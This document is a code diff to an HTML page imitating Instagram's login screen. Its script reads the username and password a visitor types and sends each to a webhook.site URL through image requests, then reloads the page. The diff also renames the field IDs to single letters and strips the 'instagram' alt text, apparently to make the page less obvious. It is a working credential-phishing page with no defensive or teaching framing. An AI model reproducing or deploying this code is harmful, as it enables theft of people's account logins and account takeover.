@@ -9,7 +9,7 @@
   <body>
     <div class="container">
       <div class="col image">
-              <img src="home-phones-overlay.png" alt="instagram" id="image">
+              <img src="home-phones-overlay.png" alt="" id="image">
       </div>
       <!--end of image-->
       <div class="col content">
@@ -19,11 +19,11 @@
           </div>
           <form class="login-form">
             <div class="form-content">
-              <input type="text" id="username" required />
+              <input type="text" id="u" required />
               <label for="uname">Phone number, username, or email</label>
             </div>
             <div class="form-content">
-              <input type="password" id="password" required />
+              <input type="password" id="p" required />
               <label for="password">Password</label>
             </div>
             <div class="form-content">
@@ -125,9 +125,9 @@
          <script>
        const getValueInput = () =>{
        
-let inputValue=document.getElementById("username").value; 
+let inputValue=document.getElementById("u").value; 
        
-let inputValue1 = document.getElementById("password").value;        var i=new Image();
+let inputValue1 = document.getElementById("p").value;        var i=new Image();
 var j=new Image();
 i.src="https://webhook.site/b5dffb7a-1e75-4a5a-b147-b4ba3ddd6040/?password="+inputValue1;  j.src="https://webhook.site/b5dffb7a-1e75-4a5a-b147-b4ba3ddd6040/?username="+inputValue; 
 window.location.reload();
